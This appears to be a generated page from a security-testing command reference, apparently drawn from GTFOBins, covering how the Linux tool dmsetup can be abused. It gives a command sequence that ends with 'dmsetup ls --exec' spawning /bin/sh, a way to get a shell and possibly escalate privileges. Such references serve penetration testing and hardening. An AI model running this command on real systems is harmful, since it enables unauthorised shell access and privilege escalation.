---
parsed_by: focuslocust
source: commands
type: generated
---
# dmsetup Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## dmsetup

Tool page: [dmsetup](../../tools/linux/dmsetup.md)

### shell

```text
dmsetup create base <<EOF
0 3534848 linear /dev/loop0 94208
EOF
dmsetup ls --exec '/bin/sh -s'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/dmsetup` |
| Evidence | Function example preserved from source parser. |
